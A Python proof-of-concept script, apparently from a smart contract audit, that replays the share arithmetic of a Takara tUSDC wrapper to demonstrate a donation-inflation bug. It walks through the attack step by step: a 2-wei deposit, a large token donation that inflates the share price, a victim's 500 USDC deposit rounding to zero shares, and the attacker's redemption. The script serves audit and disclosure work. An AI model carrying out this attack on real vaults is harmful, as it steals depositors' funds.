"""Integer replay of SpectraWrappedTakara's share math (offset 0, OZ mulDiv floor) on the live
Takara tUSDC exchange rate from test/utils/LocalDeployment.sol. Shows bug B1 (properties S4/S5/I1).
Run: python3 -I poc/donation_inflation.py"""

E = 10**18
RATE = 1_043_481_707_972_219_062          # live tUSDC exchange rate (underlying per tToken, x1e18)
ONE_SHARE = 10**6                         # decimals() = tToken decimals (6) + offset 0


class Wrapper:
    def __init__(self):
        self.S = 0          # wrapper totalSupply
        self.V = 0          # tToken.balanceOf(wrapper)  <- live balance, includes donations

    def preview_wrap(self, t):      # _previewWrap: t * (S + 1) / (V + 1), floor
        return t * (self.S + 1) // (self.V + 1)

    def preview_unwrap(self, s):    # _previewUnwrap: s * (V + 1) / (S + 1), floor
        return s * (self.V + 1) // (self.S + 1)

    def convert_to_assets(self, s):  # _convertToAssets -> mulScalarTruncate
        return RATE * self.preview_unwrap(s) // E

    def price(self):
        return self.convert_to_assets(ONE_SHARE)

    def deposit(self, a):           # previewDeposit then tToken.mint(a)
        t = (E * a * E // RATE) // E             # divScalarByExpTruncate
        s = self.preview_wrap(t)
        self.V += t
        self.S += s
        return s

    def redeem(self, s):
        t = self.preview_unwrap(s)
        self.S -= s
        self.V -= t
        return RATE * t // E


w = Wrapper()
print("fresh wrapper: price of one share =", w.price(), "wei USDC")

# 1. attacker deposits 2 wei USDC into the fresh wrapper -> 1 share
att_shares = w.deposit(2)
att_cost = 2
print("attacker deposit 2 wei -> shares:", att_shares)

# S4: a donation of tTokens moves the price
donation = 1_000_000_000                  # 1e9 tTokens ~= 1043.48 USDC
price_before = w.price()
w.V += donation                           # tToken.transfer(wrapper, donation)
att_cost += RATE * donation // E
print(f"S4: price before donation {price_before}, after {w.price()}  -> CHANGED")

# S5 / I1: victim deposits 500 USDC and receives nothing
victim_assets = 500 * 10**6
victim_shares = w.deposit(victim_assets)
print(f"S5: victim deposits {victim_assets} wei USDC -> shares {victim_shares}, "
      f"worth {w.convert_to_assets(victim_shares)} (required >= {victim_assets - 10})")

# attacker exits
att_out = w.redeem(att_shares)
print(f"attacker spent {att_cost} wei USDC, got back {att_out}; "
      f"victim lost {victim_assets}; left in wrapper with no owner: {w.V} tTokens")
